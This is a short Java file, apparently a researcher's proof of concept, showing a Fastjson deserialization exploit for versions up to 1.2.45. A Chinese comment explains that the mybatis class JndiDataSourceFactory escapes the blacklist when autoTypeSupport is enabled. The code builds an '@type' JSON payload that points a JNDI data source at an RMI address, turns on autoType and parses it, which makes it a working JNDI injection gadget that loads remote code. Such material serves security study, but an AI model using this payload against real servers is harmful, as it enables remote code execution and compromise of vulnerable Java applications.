package Fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * @author L3ttuc3
 * @version 1.0
 * @date 2023/5/12 14:57
 */
public class Fastjson1245 {
    public static void main(String[] args) {
        /*
        Fastjson 1.2.44-1.2.45版本对L;和[都进行了优化操作，使得之前的方法都不行了
        但是我们依旧有黑名单里没有的类:org.apache.ibatis.datasource.jndi.JndiDataSourceFactory，这个类依赖mybatis
        条件：mybatis3 <=3.4.6，并需要开启autoTypeSupport

        注：这个方法Fastjson <= 1.2.45 通杀
         */

        String payload2 = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://localhost:1099/obj\"}";
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        JSON.parse(payload2);
    }
}
